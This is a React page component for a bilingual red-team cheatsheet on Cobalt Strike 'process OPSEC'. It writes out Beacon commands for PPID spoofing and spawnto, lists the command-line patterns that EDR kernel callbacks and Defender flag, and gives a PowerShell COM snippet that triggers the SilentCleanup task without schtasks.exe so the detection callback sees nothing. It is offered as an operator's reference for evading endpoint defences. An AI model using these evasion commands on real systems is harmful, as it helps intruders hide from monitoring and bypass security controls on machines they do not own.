"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function ProcessOpsecPage() {
  const { lang } = useLanguage();

  const ppidSpawnto =
`# Trouver un PID cible
ps

# Configurer parent + processus sacrificiel
ppid 4512
spawnto x64 %windir%\\sysnative\\notepad.exe

# Fork & run - le processus apparaît sous explorer.exe
execute-assembly Seatbelt.exe -group=system

# Reset
ppid
spawnto x64`;

  const comBypass =
`# Trigger SilentCleanup via COM - aucune ligne de commande schtasks.exe
$sched = New-Object -ComObject Schedule.Service
$sched.Connect()
$task = $sched.GetFolder("\\Microsoft\\Windows\\DiskCleanup").GetTask("SilentCleanup")
$task.Run($null)`;

  const sections = [
    {
      id: "blending",
      title: lang === "fr" ? "Process blending" : "Process blending",
      entries: [
        {
          cmd: ppidSpawnto,
          why: lang === "fr"
            ? "ppid : les processus spawned apparaissent comme enfants du PID cible plutôt que du processus hôte de Beacon. spawnto : contrôle le processus sacrificiel pour les commandes fork&run (execute-assembly, powerpick...). Combiner les deux : le process sacrificiel devient enfant du parent spoofé. La cohérence (canal C2, hôte, parent, spawnto) est l'objectif - pas de config universelle."
            : "ppid: spawned processes appear as children of the target PID instead of Beacon's host process. spawnto: controls the sacrificial process for fork&run commands (execute-assembly, powerpick...). Combined: the sacrificial process becomes a child of the spoofed parent. Consistency (C2 channel, host, parent, spawnto) is the goal - no universal config.",
        },
      ],
    },
    {
      id: "detections",
      title: lang === "fr" ? "Détections et bypass" : "Detections and bypass",
      entries: [
        {
          cmd: "PsSetCreateProcessNotifyRoutineEx → CommandLine → STATUS_ACCESS_DENIED",
          why: lang === "fr"
            ? "Les drivers EDR enregistrent un callback à chaque création de processus. Si la ligne de commande matche un pattern signé, le driver met CreationStatus à STATUS_ACCESS_DENIED. Non désactivable sans exécution kernel. Patterns CS observables : shell → cmd.exe /C <cmd>, run → <cmd>, powershell → powershell -nop -exec bypass -EncodedCommand <b64>, fork&run → <spawnto>."
            : "EDR drivers register a callback on every process creation. If CommandLine matches a signed pattern, the driver sets CreationStatus to STATUS_ACCESS_DENIED. Cannot be disabled without kernel execution. Observable CS patterns: shell → cmd.exe /C <cmd>, run → <cmd>, powershell → powershell -nop -exec bypass -EncodedCommand <b64>, fork&run → <spawnto>.",
        },
        {
          cmd: "cmd.exe /c echo <token> > \\\\.\\pipe\\<id>   (pth / CreateProcessWithLogonW)",
          why: lang === "fr"
            ? "La commande pth utilise CreateProcessWithLogonW pour echo un token dans un named pipe - pattern signé par Defender."
            : "The pth command uses CreateProcessWithLogonW to echo a token into a named pipe - a pattern signed by Defender.",
        },
        {
          cmd: "schtasks.exe /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I",
          why: lang === "fr"
            ? "L'exploit uac-schtasks invoque schtasks.exe avec SilentCleanup - pattern signé. Résultat : STATUS_ACCESS_DENIED sur Start-Process."
            : "The uac-schtasks exploit invokes schtasks.exe with SilentCleanup - a signed pattern. Result: STATUS_ACCESS_DENIED on Start-Process.",
        },
        {
          cmd: comBypass,
          why: lang === "fr"
            ? "Si un binaire est signé sur sa ligne de commande, trouver un COM object ou une API native qui produit le même effet sans l'invoquer. Schedule.Service trigger SilentCleanup sans passer par schtasks.exe - aucune ligne de commande observable par le callback."
            : "If a binary is detected on its command line, find a COM object or native API that produces the same effect without invoking it. Schedule.Service triggers SilentCleanup without calling schtasks.exe - no command line visible to the callback.",
        },
      ],
    },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Cobalt Strike</p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Process OPSEC</h1>
        <p className="mt-3 text-sm leading-7 text-muted-foreground">
          {lang === "fr"
            ? "PPID spoofing, spawnto et bypass des détections kernel sur les lignes de commande."
            : "PPID spoofing, spawnto, and bypass of kernel command-line detections."}
        </p>
      </header>

      {sections.map((section) => (
        <section key={section.id} id={section.id} className="mb-10">
          <h2 className="mb-4 font-mono text-xs uppercase tracking-widest text-primary">
            {section.title}
          </h2>
          <div className="space-y-4">
            {section.entries.map((entry, i) => (
              <CheatsheetCommandCard key={i} cmd={entry.cmd} why={entry.why} lang={lang} />
            ))}
          </div>
        </section>
      ))}
    </div>
  );
}
